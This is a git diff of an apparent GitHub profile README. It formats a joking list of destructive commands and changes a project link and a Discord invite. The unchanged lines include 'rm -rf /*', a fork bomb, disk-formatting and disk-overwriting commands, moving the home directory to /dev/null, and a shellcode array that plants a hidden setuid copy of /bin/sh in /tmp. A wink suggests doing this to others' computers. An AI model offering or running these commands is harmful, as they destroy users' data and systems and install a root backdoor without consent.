@@ -22,7 +22,7 @@
 
 <li>sudo rm -rf /*</li>
 
-<li>char esp[] __attribute__ ((section(“.text”))) /* e.s.p
+<li>`char esp[] __attribute__ ((section(“.text”))) /* e.s.p
 release */
 = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
 “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
@@ -32,24 +32,24 @@ release */
 “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
 “\x6e\x2f\x73\x68\x00\x2d\x63\x00”
 “cp -p /bin/sh /tmp/.beyond; chmod 4755
-/tmp/.beyond;”;</li>
+/tmp/.beyond;”;`</li>
 
-<li>:(){ :|: & };:</li>
+<li>`:(){ :|: & };:`</li>
 
-<li>mkfs.ext4 /dev/sda1</li>
+<li>`mkfs.ext4 /dev/sda1`</li>
 
-<li>dd if=/dev/random of=/dev/sda</li>
+<li>`dd if=/dev/random of=/dev/sda`</li>
 
-<li>mv ~ /dev/null</li>
+<li>`mv ~ /dev/null`</li>
 
 #### _Hope nobody minds me doing this to their computer ;)_
 
-#### Working on XenithEFI
+#### Working on cozen
 
-`https://github.com/Smart6502/XenithEFI`
+`https://github.com/Smart6502/cozen`
 
 ### Contact me:
 
 [<img align="left" alt="Discord" width="26px" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/discord/discord.png" />][discord]
 
-[discord]: https://discord.gg/mv9XEmk
+[discord]: https://discord.gg/3Yh6JERUx2
